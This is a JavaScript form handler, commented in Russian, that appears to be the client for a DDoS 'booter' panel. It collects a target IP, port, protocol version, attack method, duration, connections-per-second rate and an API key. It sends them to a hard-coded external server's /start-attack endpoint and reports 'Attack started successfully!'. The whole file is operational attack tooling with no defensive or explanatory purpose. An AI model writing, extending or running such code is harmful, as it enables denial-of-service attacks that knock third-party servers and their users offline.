document.getElementById('attackForm').addEventListener('submit', async function (e) {
    e.preventDefault();

    // Получаем выбранную версию
    const versionSelect = document.getElementById('version');
    const version = versionSelect.value;

    const formData = new FormData(this);
    const data = {
        ip: formData.get('ip'),
        port: formData.get('port'),
        protocol: version,  // Используем выбранный протокол
        method: formData.get('method'),
        seconds: formData.get('seconds'),
        target_cps: formData.get('target_cps'),
        api_key: formData.get('api_key')  // API-ключ из формы
    };

    // Показываем статус "Sending attack..."
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('response').innerHTML = "<p>Sending attack...</p>";

    try {
        const response = await fetch('http://89.149.109.110:8000/start-attack', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        if (response.ok) {
            document.getElementById('response').innerHTML = `
                <p>Attack started successfully!</p>
                <pre>${JSON.stringify(result, null, 2)}</pre>
            `;
        } else {
            document.getElementById('response').innerHTML = `
                <p>Error: ${result.detail}</p>
            `;
        }
    } catch (error) {
        document.getElementById('response').innerHTML = `
            <p>Error: ${error.message}</p>
        `;
    } finally {
        document.getElementById('status').classList.add('hidden');
    }
});
